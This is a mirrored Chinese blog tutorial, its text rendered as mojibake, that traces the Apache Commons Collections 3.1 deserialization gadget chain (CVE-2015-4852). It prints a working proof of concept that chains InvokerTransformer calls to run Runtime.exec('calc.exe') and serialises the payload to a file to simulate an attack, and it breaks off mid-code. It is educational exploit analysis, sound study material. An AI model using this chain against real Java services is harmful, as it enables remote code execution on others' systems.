<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>JAVAååºåˆ—åŒ– - commons-collections - 1 | æå®¢å¿«è¨Š</title><meta property="og:title" content="JAVAååºåˆ—åŒ– - commons-collections - 1 - æå®¢å¿«è¨Š"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/ecc736cc16fc4ab584bae36f7724c7c8"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><meta property="article:published_time" content="2020-11-14T21:03:08+08:00"><meta property="article:modified_time" content="2020-11-14T21:03:08+08:00"><meta name=Keywords content><meta name=description content="JAVAååºåˆ—åŒ– - commons-collections - 1"><meta name=author content="æå®¢å¿«è¨Š"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/a6b9d78d.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>ğŸ¤“ æå®¢å¿«è¨Š Geek Bank</a></h1><p class=description>ç‚ºä½ å¸¶ä¾†æœ€å…¨çš„ç§‘æŠ€çŸ¥è­˜ ğŸ§¡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>çŒœä½ å–œæ­¡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=ç§‘æŠ€>ç§‘æŠ€</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=éŠæˆ²>éŠæˆ²</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=ç§‘å­¸>ç§‘å­¸</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>JAVAååºåˆ—åŒ– - commons-collections - 1</h1></header><date class="post-meta meta-date">2020-11-14</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>ç§‘æŠ€</a></span></div><div class=post-content><p>ä»¥ä¸‹æ–‡ç« ä¾†æºæ–¼é›·ç¥çœ¾æ¸¬ ï¼Œä½œè€…lala</p><p><strong>No.1è²æ˜</strong></p><p>ç”±æ–¼å‚³æ’­ã€åˆ©ç”¨æ­¤æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–è€…é–“æ¥çš„å¾ŒæœåŠæå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè² è²¬ï¼Œé›·ç¥çœ¾æ¸¬ä»¥åŠæ–‡ç« ä½œè€…ä¸ç‚ºæ­¤æ‰¿æ“”ä»»ä½•è²¬ä»»ã€‚é›·ç¥çœ¾æ¸¬æ“æœ‰å°æ­¤æ–‡ç« çš„ä¿®æ”¹å’Œè§£é‡‹æ¬Šã€‚å¦‚æ¬²è½‰è¼‰æˆ–å‚³æ’­æ­¤æ–‡ç« ï¼Œå¿…é ˆä¿è­‰æ­¤æ–‡ç« çš„å®Œæ•´æ€§ï¼ŒåŒ…æ‹¬ç‰ˆæ¬Šè²æ˜ç­‰å…¨éƒ¨å…§å®¹ã€‚æœªç¶“é›·ç¥çœ¾æ¸¬å…è¨±ï¼Œä¸å¾—ä»»æ„ä¿®æ”¹æˆ–è€…å¢æ¸›æ­¤æ–‡ç« å…§å®¹ï¼Œä¸å¾—ä»¥ä»»ä½•æ–¹å¼å°‡å…¶ç”¨æ–¼å•†æ¥­ç›®çš„ã€‚</p><p><strong>No.2å‰è¨€</strong></p><p>é€™æ˜¯å€‹äººå­¸ç¿’javaååºåˆ—åŒ–çš„ç¬¬ä¸€ç¯‡åˆ©ç”¨éˆçš„æ–‡ç« ï¼Œå°±å¥½åƒPç‰›èªªçš„ä¸çŸ¥é“ç‚ºä»€éº¼ç¶²ä¸Šè¬›åˆ°javaååºåˆ—åŒ–å­¸ç¿’ï¼Œä¸Šä¾†å°±æ˜¯ccéˆï¼Œä½ çŸ¥é“é€™å€‹éˆå®ƒæœ‰å¤šè¤‡é›œéº¼.jpgã€‚èŒæ–°ä¹Ÿæ˜¯ç†æ‰€ç•¶ç„¶çš„è¸©äº†é€™å€‹å‘ï¼Œç„¶å¾Œâ€¦..åœ¨ä¸€è·¯è³ªç–‘è‡ªå·±æ™ºå•†å’Œ"æˆ‘ä¸æœ"çš„æƒ…æ³ä¸‹è¶Ÿäº†éå»ã€‚</p><p>è·¯é›£è¡Œï¼Œé›£è¡Œï¼Œç¸½æ­¸è¦èµ°ã€‚</p><p>èµ°ä¾†ï¼Œå›æœ›å»ï¼Œå‘µï¼Œç‰›é€¼ã€‚</p><p>åœ¨æ­¤æ–‡ä¸­æ˜¯ä»¥ä¸€å€‹åªç­è§£javaåå°„æ©Ÿåˆ¶å’Œååºåˆ—åŒ–åˆ©ç”¨é»ï¼ˆreadObjectï¼‰çš„è¦–è§’å»ä¸€é»é»å¾©ç¾æ¨å°äº†commons-collectionsã€jdk1.7çš„pocçš„æ§‹é€ ã€‚</p><p>åŒæ™‚è¨˜éŒ„ä¸‹äº†ä¸€å€‹å€‹è¸©çš„å‘ï¼Œå†çˆ¬å‡ºä¾†ï¼Œå†è·³é€²å»ï¼Œå†çˆ¬å‡ºä¾†çš„æ­·ç¨‹ã€‚</p><p>å¦‚æœä½ å…·å‚™äº†åå°„æ©Ÿåˆ¶å’Œååºåˆ—åŒ–åŸºæœ¬åŸç†çš„çŸ¥è­˜ï¼ŒåŒæ™‚æƒ³å­¸ç¿’ccéˆçš„è©±ï¼Œå€‹äººæ„Ÿè¦ºæ˜¯é€™ç¯‡æ–‡æ˜¯å†é©åˆä¸éäº†ã€‚</p><p>é‚£éº¼é–‹å§‹ã€‚</p><p>ç­è§£åå°„æ©Ÿåˆ¶çš„è©±ï¼Œæˆ‘å€‘æœƒç™¼ç¾è‹¥å­˜åœ¨ä¸€å€‹å›ºæœ‰çš„åå°„æ©Ÿåˆ¶æ™‚ï¼Œè¼¸å…¥å¯æ§ï¼Œå°±å¯èƒ½å½¢æˆä»»æ„å‡½æ•¸èª¿ç”¨çš„æƒ…æ³ï¼Œå…·æœ‰æ¥µå¤§çš„å±å®³ã€‚ä½†å¯¦éš›ä¸ŠçœŸçš„æœ‰å­˜åœ¨é€™ç¨®æƒ…æ³ï¼šé€™å°±æ˜¯commons-collections-3.1 jaråŒ…ï¼Œcveç·¨è™Ÿï¼šcve-2015-4852</p><p>åœ¨é–‹å§‹ä¹‹å‰æˆ‘å€‘éœ€è¦ç†ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´çš„æ”»æ“Šæµç¨‹ï¼š</p><ol start=1><li>å®¢æˆ¶ç«¯æ§‹é€ payload(æœ‰æ•ˆè¼‰è·)ï¼Œä¸¦é€²è¡Œä¸€å±¤å±¤çš„å°è£ï¼Œå®Œæˆæœ€å¾Œçš„expï¼ˆexploit-åˆ©ç”¨ä»£ç¢¼ï¼‰</li><li>expç™¼é€åˆ°æœå‹™ç«¯ï¼Œé€²å…¥ä¸€å€‹æœå‹™ç«¯è‡ªä¸»è¤‡å¯«ï¼ˆä¹Ÿå¯èƒ½æ˜¯ä¹Ÿæœ‰çµ„ä»¶è¤‡å¯«ï¼‰çš„readobjectå‡½æ•¸ï¼Œå®ƒæœƒååºåˆ—åŒ–æ¢å¾©æˆ‘å€‘æ§‹é€ çš„expå»å½¢æˆä¸€å€‹æƒ¡æ„çš„æ•¸æ“šæ ¼å¼exp_1ï¼ˆå‰å»ç¬¬ä¸€å±¤ï¼‰</li><li>é€™å€‹æƒ¡æ„æ•¸æ“šexp_1åœ¨æ¥ä¸‹ä¾†çš„è™•ç†æµç¨‹(å¯èƒ½æ˜¯åœ¨è‡ªä¸»è¤‡å¯«çš„readobjectä¸­ã€ä¹Ÿå¯èƒ½æ˜¯åœ¨å¤–é¢çš„é‚è¼¯ä¸­)ï¼ŒæœƒåŸ·è¡Œä¸€å€‹exp_1é€™å€‹æƒ¡æ„æ•¸æ“šé¡çš„ä¸€å€‹æ–¹æ³•ï¼Œåœ¨æ–¹æ³•ä¸­æœƒæ ¹æ“šexp_1çš„å…§å®¹é€²è¡Œå‡½è™•ç†ï¼Œå¾è€Œä¸€å±¤å±¤åœ°å‰å»ï¼ˆæˆ–è€…èªªè®Šå½¢ã€è§£æï¼‰æˆ‘å€‘exp_1è®Šæˆexp_2ã€exp_3â€¦â€¦</li><li>æœ€å¾Œåœ¨ä¸€å€‹å¯åŸ·è¡Œä»»æ„å‘½ä»¤çš„å‡½æ•¸ä¸­åŸ·è¡Œæœ€å¾Œçš„payloadï¼Œå®Œæˆé ç¨‹ä»£ç¢¼åŸ·è¡Œã€‚</li></ol><p>é‚£éº¼ä»¥ä¸Šå¤§æ¦‚å¯ä»¥åˆ†æˆä¸‰å€‹ä¸»è¦éƒ¨åˆ†ï¼š</p><ol start=1><li>payloadï¼šéœ€è¦è®“æœå‹™ç«¯åŸ·è¡Œçš„èªå¥ï¼šæ¯”å¦‚èªªå½ˆè¨ˆç®—å™¨é‚„æ˜¯åŸ·è¡Œé ç¨‹è¨ªå•ç­‰ï¼›æˆ‘æŠŠå®ƒç¨±ç‚ºï¼špayload</li><li>ååºåˆ—åŒ–åˆ©ç”¨éˆï¼šæœå‹™ç«¯ä¸­å­˜åœ¨çš„ååºåˆ—åŒ–åˆ©ç”¨éˆï¼Œæœƒä¸€å±¤å±¤æ’¥é–‹æˆ‘å€‘çš„expï¼Œæœ€å¾ŒåŸ·è¡Œpayloadã€‚(åœ¨æ­¤ç¯‡ä¸­å°±æ˜¯commons-collectionsåˆ©ç”¨éˆ)</li><li>readObjectè¤‡å¯«åˆ©ç”¨é»ï¼šæœå‹™ç«¯ä¸­å­˜åœ¨çš„å¯ä»¥èˆ‡æˆ‘å€‘æ¼æ´éˆç›¸æ¥çš„ä¸¦ä¸”å¯ä»¥å¾å¤–éƒ¨è¨ªå•çš„readObjectå‡½æ•¸è¤‡å¯«é»ï¼›æˆ‘æŠŠå®ƒç¨±ç‚ºreadObjectè¤‡å¯«åˆ©ç”¨é»ï¼ˆè‡ªå‰µåç¨±â€¦ï¼‰</li></ol><p><strong>No.3commons-collections-3.1</strong></p><p>é¦–å…ˆä¾†çœ‹çœ‹commons-collectionsé …ç›®å§å®˜ç¶²ç¬¬ä¸€æ®µï¼š</p><p>Java commons-collectionsæ˜¯JDK 1.2ä¸­çš„ä¸€å€‹ä¸»è¦æ–°å¢éƒ¨åˆ†ã€‚å®ƒæ·»åŠ äº†è¨±å¤šå¼·å¤§çš„æ•¸æ“šçµæ§‹ï¼Œå¯ä»¥åŠ é€Ÿå¤§å¤šæ•¸é‡è¦Javaæ‡‰ç”¨ç¨‹åºçš„é–‹ç™¼ã€‚å¾é‚£æ™‚èµ·ï¼Œå®ƒå·²ç¶“æˆç‚ºJavaä¸­å…¬èªçš„é›†åˆè™•ç†æ¨™æº–ã€‚</p><p>Apache Commons Collectionsæ˜¯ä¸€å€‹æ“´å±•äº†Javaæ¨™æº–åº«è£¡çš„Collectionçµæ§‹çš„ç¬¬ä¸‰æ–¹åŸºç¤åº«ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼·æœ‰åŠ›çš„æ•¸æ“šçµæ§‹é¡å‹ä¸¦ä¸”å¯¦ç¾äº†å„ç¨®é›†åˆå·¥å…·é¡ã€‚ä½œç‚ºApacheé–‹æºé …ç›®çš„é‡è¦çµ„ä»¶ï¼ŒCommons Collectionsè¢«å»£æ³›æ‡‰ç”¨æ–¼å„ç¨®Javaæ‡‰ç”¨çš„é–‹ç™¼ã€‚å®ƒæ˜¯ä¸€å€‹åŸºç¤æ•¸æ“šçµæ§‹åŒ…ï¼ŒåŒæ™‚å°è£äº†å¾ˆå¤šåŠŸèƒ½ï¼Œå…¶ä¸­æˆ‘å€‘éœ€è¦é—œæ³¨ä¸€å€‹åŠŸèƒ½ï¼š</p><ul><li>Transforming decorators that alter each object as it is added to the collection</li><li>è½‰åŒ–è£é£¾å™¨ï¼šä¿®æ”¹æ¯ä¸€å€‹æ·»åŠ åˆ°collectionä¸­çš„object</li></ul><p>Commons Collectionså¯¦ç¾äº†ä¸€å€‹TransformedMapé¡ï¼Œè©²é¡æ˜¯å°Javaæ¨™æº–æ•¸æ“šçµæ§‹Mapæ¥å£çš„ä¸€å€‹æ“´å±•ã€‚è©²é¡å¯ä»¥åœ¨ä¸€å€‹å…ƒç´ è¢«åŠ å…¥åˆ°é›†åˆå…§æ™‚ï¼Œè‡ªå‹•å°è©²å…ƒç´ é€²è¡Œç‰¹å®šçš„ä¿®é£¾è®Šæ›ï¼Œå…·é«”çš„è®Šæ›é‚è¼¯ç”±Transformeré¡å®šç¾©ï¼ŒTransformeråœ¨TransformedMapå¯¦ä¾‹åŒ–æ™‚ä½œç‚ºåƒæ•¸å‚³å…¥ã€‚org.apache.commons.collections.Transformeré€™å€‹é¡å¯ä»¥æ»¿è¶³å›ºå®šçš„é¡å‹è½‰åŒ–éœ€æ±‚ï¼Œå…¶è½‰åŒ–å‡½æ•¸å¯ä»¥è‡ªå®šç¾©å¯¦ç¾ï¼Œæˆ‘å€‘çš„æ¼æ´è§¸ç™¼å‡½æ•¸å°±æ˜¯åœ¨æ–¼é€™å€‹é»ã€‚</p><p>æ¼æ´å¾©ç¾éœ€è¦ä¸‹è¼‰3.1ç‰ˆæœ¬,é€²å»å°‹è¦“ä¸€ä¸‹æºç¢¼å’ŒjaråŒ…éƒ½æœ‰ã€‚</p><p>ç”±æ–¼æ²’æœ‰æ‰¾åˆ°æ¼æ´ç‰ˆæœ¬3.1çš„apièªªæ˜ï¼Œæˆ‘å€‘å¯ä»¥åƒè€ƒ3.2.2çš„apiæ–‡æª”</p><p><strong>No.4POC->åˆ©ç”¨éˆ</strong></p><p>æˆ‘å€‘å°‡é€šéèª¿è©¦POCå¾—åˆ°æ¼æ´åˆ©ç”¨éˆçš„èª¿ç”¨æ£§ï¼Œé †ä¾¿ä»‹ç´¹ä¸€ä¸‹å„å€‹é¡ï¼Œå†é€šéåˆ†æèª¿ç”¨æ£§çš„å‡½æ•¸ï¼Œåæ¨å‡ºPOCä¾†æ¢ç©¶å…¶ä¸­çš„åˆ©ç”¨åŸç†ã€‚</p><p>æˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹ç¶²ä¸Šçš„POCä»£ç¢¼ï¼Œå¦‚ä¸‹ï¼š</p><p>import org.apache.commons.collections.*;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class commons_collections_3_1 { public static void main(String args) throws Exception { //æ­¤è™•æ§‹å»ºäº†ä¸€å€‹transformersçš„æ•¸çµ„ï¼Œåœ¨å…¶ä¸­æ§‹å»ºäº†ä»»æ„å‡½æ•¸åŸ·è¡Œçš„æ ¸å¿ƒä»£ç¢¼Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //å°‡transformersæ•¸çµ„å­˜å…¥ChaniedTransformeré€™å€‹ç¹¼æ‰¿é¡Transformer transformerChain = new ChainedTransformer(transformers); //å‰µå»ºMapä¸¦ç¶å®štransformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //çµ¦äºˆmapæ•¸æ“šè½‰åŒ–éˆMap outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //è§¸ç™¼æ¼æ´Map.Entry onlyElement = (Map.Entry) outerMap.entrySet.iterator.next; //outerMapå¾Œä¸€ä¸²æ±è¥¿ï¼Œå…¶å¯¦å°±æ˜¯ç²å–é€™å€‹mapçš„ç¬¬ä¸€å€‹éµå€¼å°ï¼ˆvalue,valueï¼‰ï¼›ç„¶å¾Œè½‰åŒ–æˆMap.Entryå½¢å¼ï¼Œé€™æ˜¯mapçš„éµå€¼å°æ•¸æ“šæ ¼å¼onlyElement.setValue("foobar");}}</p><p>å¥½å¥½çœ‹ä»£ç¢¼çš„åŒå­¸è‚¯å®šæœƒæ„è­˜åˆ°ï¼Œä»¥ä¸Šçš„pocå…¶å¯¦åªåŒ…æ‹¬æˆ‘ç¸½çµä¸‰è¦ç´ çš„payloadå’Œååºåˆ—åŒ–åˆ©ç”¨éˆå…©è€…ã€‚è€Œé—œéµçš„readObjectè¤‡å¯«åˆ©ç”¨é»æ²’æœ‰åŒ…å«åœ¨å…§ã€‚äº‹å¯¦ç¢ºå¯¦å¦‚æ­¤ã€‚é€™å€‹pocçš„è¤‡å¯«åˆ©ç”¨é»æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerçš„readObjectï¼Œä½†æ˜¯æˆ‘å€‘å…ˆç²¾ç°¡ä»£ç¢¼é—œæ³¨payloadå’Œåˆ©ç”¨éˆï¼Œæœ€å¾Œå†åŠ ä¸ŠreadObjectè¤‡å¯«é»ã€‚</p><p>èª¿è©¦ä»¥ä¸ŠPOCï¼Œå¾—åˆ°å…©ç¨®èª¿ç”¨æ£§ï¼š</p><p><strong>æ¼æ´éˆ</strong></p><p>Map.Entryå…¶å¯¦å°±æ˜¯éµå€¼å°çš„æ•¸æ“šæ ¼å¼ï¼Œå…¶setValueå‡½æ•¸å¦‚ä¸‹AbstracInputCheckedMapDecorator.class</p><p>public Object setValue(Object value) {value = this.parent.checkSetValue(value);//é€²å…¥æ­¤è™•return super.entry.setValue(value);}</p><p>TransformedMapæ˜¯ä¸€ç¨®é‡å¯«mapé¡å‹çš„setå‡½æ•¸å’ŒMap.Entryé¡å‹çš„setValueå‡½æ•¸å»èª¿ç”¨è½‰æ›éˆçš„Mapé¡å‹ã€‚TransformedMap.class</p><p>protected Object checkSetValue(Object value) { return this.valueTransformer.transform(value);//é€²å…¥æ­¤è™•}</p><p>ç”±æ–¼TransformedMapå…·æœ‰commons_collectionsçš„è½‰è®Šç‰¹æ€§ï¼Œç•¶è³¦å€¼ä¸€å€‹éµå€¼å°çš„æ™‚å€™æœƒè‡ªå‹•å°è¼¸å…¥å€¼é€²è¡Œé è¨­çš„Transformerçš„èª¿ç”¨ã€‚</p><p>ChainedTransformer.classï¼šé€™è£¡æœ‰ä¸€å€‹</p><p>public Object transform(Object object) { for(int i = 0; i &lt; this.iTransformers.length; ++i) { //å¾ªç’°é€²å…¥æ­¤è™•ï¼Œå…ˆé€²å…¥1æ¬¡ConstantTransformer.classï¼Œå†3æ¬¡InvokerTransformer.classobject = this.iTransformers[i].transform(object); //å¦å¤–éœ€è¦æ³¨æ„åœ¨æ•¸çµ„çš„å¾ªç’°ä¸­ï¼Œå‰ä¸€æ¬¡transformå‡½æ•¸çš„è¿”å›å€¼ï¼Œæœƒä½œç‚ºä¸‹ä¸€æ¬¡transformå‡½æ•¸çš„objectåƒæ•¸è¼¸å…¥ã€‚} return object;}</p><p>transformå‡½æ•¸æ˜¯ä¸€å€‹æ¥å£å‡½æ•¸ï¼Œåœ¨ä¸Šé¢çš„å¾ªç’°ä¸­é€²å…¥äº†ä¸åŒçš„å‡½æ•¸ã€‚å…ˆæ˜¯1æ¬¡ConstantTransformer.class</p><p>public Object transform(Object input) { return this.iConstant;}</p><p>å†æ˜¯é€²å…¥äº†InvokerTransformer.classï¼Œçœ‹åˆ°é€™å€‹å°±æœƒç™¼ç¾æœ‰é»æ±è¥¿äº†ã€‚</p><p>public Object transform(Object input) { if (input == null) { return null;} else { try { //ç²å–inputå°è±¡çš„classClass cls = input.getClass; //æ ¹æ“šiMethodNameã€iParamTypesé¸æ“‡clsä¸­çš„ä¸€å€‹æ–¹æ³•Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //æ ¹æ“šiArgsåƒæ•¸èª¿ç”¨é€™å€‹æ–¹æ³•return method.invoke(input, this.iArgs);} catch (NoSuchMethodException var5) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' does not exist");} catch (IllegalAccessException var6) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' cannot be accessed");} catch (InvocationTargetException var7) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' threw an exception", var7);}}}}</p><p>æ˜é¡¯çš„åå°„æ©Ÿåˆ¶ï¼Œå¯è¦‹InvokerTransformerå°±æ˜¯æˆ‘å€‘çš„è§¸ç™¼ä»»æ„ä»£ç¢¼åŸ·è¡Œè™•ï¼Œæˆ‘å€‘çœ‹çœ‹æºç¢¼ä¸­çš„æ–‡ä»¶æè¿°ï¼šå…ˆçœ‹çœ‹æˆ‘å€‘éœ€è¦é—œæ³¨çš„InvokerTransformeré¡çš„æè¿°ï¼ˆåœ¨jaråŒ…ä¸­æ˜¯æ‰¾ä¸åˆ°æè¿°ä¿¡æ¯çš„ï¼Œå¯ä»¥é€šéä¸‹è¼‰å®˜æ–¹æºç¢¼å¾—åˆ°ï¼‰ï¼š</p><p>/*** Transformer implementation that creates a new object instance by reflection.*é€šéåå°„æ©Ÿåˆ¶å‰µå»ºä¸€å€‹æ–°çš„å°è±¡å¯¦ä¾‹çš„è½‰æ›å™¨å¯¦ç¾</p><p>æˆ‘å€‘å¯ä»¥é€™è£¡æœ‰ç¶“å…¸çš„åå°„æ©Ÿåˆ¶èª¿ç”¨ï¼Œåœ¨ç´°ç¯€åˆ†æå‰æˆ‘å€‘å…ˆæ•´ç†ä¸€ä¸‹èª¿ç”¨æ£§ï¼Œä½†ä¸éœ€è¦å¾ˆç†è§£ã€‚</p><p>Map.Entry é¡å‹setValue("foobar")=> AbstracInputCheckedMapDecorator.setValue=> TransformedMap.checkSetValue=> ChainedTransformer.transform(Object object)æ ¹æ“šæ•¸çµ„ï¼Œå…ˆé€²å…¥ => ConstantTransformer.transform(Object input)å†é€²å…¥ => InvokerTransformer.transform(Object input)</p><p><strong>No.5é‡æ§‹POC</strong></p><p>é¦–å…ˆæ˜ç¢ºæˆ‘å€‘çš„æœ€çµ‚ç›®çš„æ˜¯ç‚ºäº†åŸ·è¡Œèªå¥Runtime.getRuntime.exec("calc.exe");</p><ul><li>Runtime.getRuntimeï¼šç²å–ä¸€å€‹Runtimeçš„å¯¦ä¾‹</li><li>execï¼šèª¿ç”¨å¯¦ä¾‹çš„execå‡½æ•¸</li></ul><p>å› ç‚ºæ¼æ´å‡½æ•¸æœ€å¾Œæ˜¯é€šéåå°„æ©Ÿåˆ¶èª¿ç”¨ä»»æ„é€™å€‹èªå¥å…ˆè½‰åŒ–æˆåå°„æ©Ÿåˆ¶å¦‚ä¸‹ï¼ˆå¾Œé¢éœ€è¦ç”¨åˆ°ï¼‰ï¼š</p><p>è‡³æ–¼å¦‚ä½•æ§‹é€ åå°„æ©Ÿåˆ¶çš„èªå¥ï¼Œåƒè€ƒå¾€æœŸæ–‡ç« javaåå°„æ©Ÿåˆ¶</p><p>Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//æ­¤è™•åœ¨ç²å–å¯¦ä¾‹,"calc.exe")</p><p><strong>ç¬¬ä¸€æ­¥ InvokerTransformer</strong></p><p>å†å›çœ‹åå°„æ©Ÿåˆ¶è§¸ç™¼å‡½æ•¸InvokerTransformeré¡çš„transform(Object input)ï¼ˆåšäº†ç°¡åŒ–è™•ç†ï¼Œåªç•™å–é‡é»éƒ¨åˆ†ï¼‰ï¼š</p><p>public Object transform(Object input) {Class cls = input.getClass;Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);</p><p>é€šéæ§‹é€ çš„åå°„æ©Ÿåˆ¶ä»¥åŠä»¥ä¸Šä»£ç¢¼é€²è¡Œå¡«ç©ºï¼Œå¯ä»¥å¾—å‡ºç•¶è®Šé‡ç­‰æ–¼ä»¥ä¸‹å€¼æ™‚ï¼Œå¯å½¢æˆå‘½ä»¤åŸ·è¡Œï¼š</p><p>Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));this.iMethodName="exec"this.iParamTypes=String.classthis.iArgs="calc.exe"</p><p>é‚£éº¼åœ¨InvokerTransformeré¡æºç¢¼ä¸­æˆ‘å€‘å¯ä»¥æ‰¾åˆ°è³¦å€¼this.iMethodName,this.iParamTypes,this.iArgsçš„æ§‹é€ å‡½æ•¸:</p><p>public InvokerTransformer(String methodName, Class paramTypes, Object args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;}</p><p>æˆ‘å€‘å°±å¯ä»¥æ§‹å»ºä»¥ä¸‹æ¸¬è©¦ä»£ç¢¼ç›´æ¥èª¿ç”¨InvokerTransformeré€šéåå°„åŸ·è¡Œä»»æ„å‘½ä»¤ï¼šä¸‹é¢é–‹å§‹è©¦ä¸€ä¸‹ï¼š</p><p>public static void main(String args) throws Exception { //é€šéæ§‹é€ å‡½æ•¸ï¼Œè¼¸å…¥å°æ‡‰æ ¼å¼çš„åƒæ•¸ï¼Œå°iMethodNameã€iParamTypesã€iArgsé€²è¡Œè³¦å€¼InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"}); //æ§‹é€ inputObject input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")); //åŸ·è¡Œa.transform(input);}</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ecc736cc16fc4ab584bae36f7724c7c8><p class=pgc-img-caption></p></div><p><strong>åœ¨ç¬¬äºŒæ­¥ä¹‹å‰</strong></p><p>å½ˆå‡ºäº†è¨ˆç®—å™¨ï¼å¥½åƒå¾ˆå²å®³çš„æ¨£å­ï¼ç„¶å¾Œæˆ‘å€‘ä¾†æ¨¡æ“¬ä¸€ä¸‹åˆ©ç”¨å ´æ™¯ï¼š</p><ul><li>ç‚ºäº†æ–¹ä¾¿ï¼Œæ”»æ“Šè€…å—å®³è€…å¯«åœ¨åŒä¸€å‡½æ•¸ä¸­</li><li>ä½¿ç”¨æ–‡ä»¶å¯«å…¥ï¼Œä»£æ›¿ç¶²çµ¡å‚³è¼¸</li></ul><p>ç”±æ–¼InvokerTransformerç¹¼æ‰¿äº†Serializableé¡ï¼Œæ˜¯å¯ä»¥æˆåŠŸåºåˆ—åŒ–çš„</p><p>public static void main(String args) throws Exception { //æ¨¡æ“¬æ”»æ“Š//1.å®¢æˆ¶ç«¯æ§‹é€ åºåˆ—åŒ–payloadï¼Œä½¿ç”¨å¯«å…¥æ–‡ä»¶æ¨¡æ“¬ç™¼åŒ…æ”»æ“ŠInvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"});FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(a); //2.æœå‹™ç«¯å¾æ–‡ä»¶ä¸­è®€å–payloadæ¨¡æ“¬æ¥å—åŒ…ï¼Œç„¶å¾Œè§¸ç™¼æ¼æ´//æœå‹™ç«¯ååºåˆ—åŒ–payloadè®€å–FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //ç¥å¥‡ç¬¬ä¸€è™•ï¼šæœå‹™ç«¯éœ€è¦è‡ªä¸»æ§‹é€ æƒ¡æ„inputObject input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")); //ç¥å¥‡ç¬¬äºŒè™•ï¼šæœå‹™ç«¯éœ€è¦å°‡å®¢æˆ¶ç«¯è¼¸å…¥ååºåˆ—åŒ–æˆInvokerTransformeræ ¼å¼ï¼Œä¸¦åœ¨æœå‹™ç«¯è‡ªä¸»å‚³å…¥æƒ¡æ„åƒæ•¸inputInvokerTransformer 